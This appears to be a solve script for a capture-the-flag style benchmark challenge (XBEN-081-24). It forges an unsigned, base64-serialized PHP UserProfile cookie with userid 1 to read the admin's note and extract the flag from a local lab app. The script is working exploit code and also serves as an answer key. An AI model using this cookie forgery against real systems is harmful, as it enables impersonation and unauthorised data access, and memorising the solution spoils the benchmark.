#!/usr/bin/env bash
# XBEN-081-24 — "PHP Deserialization" (tags: insecure_deserialization)
#
# Sign-in stores the whole user record in a cookie as
# `base64(serialize($profile))`, and every page reads it back with
# `unserialize()` and trusts the `userid` it finds there to pick which notes to
# show. Nothing signs the cookie, so the identity is the client's to write.
#
# `UserProfile` has no magic methods, so this is not an object-injection chain —
# it is an IDOR whose parameter happens to be a serialized object. User 1 is
# `admin`, whose note is the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben081-$$"
VICTIM="${2:-1}"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

cookie="$(python3 -c "
import base64, sys
victim = sys.argv[1]
raw = 'O:11:\"UserProfile\":2:{s:6:\"userid\";i:%s;s:8:\"username\";s:5:\"admin\";}' % victim
print(base64.b64encode(raw.encode()).decode())
" "$VICTIM")"

"$H5I" browser open "$URL/sign-in.php" --session "$SESSION" --new --capture >/dev/null
seq="$("$H5I" websec replay req_0 --create \
    --set 'path=/index.php' --set "header.Cookie=data=$cookie" \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
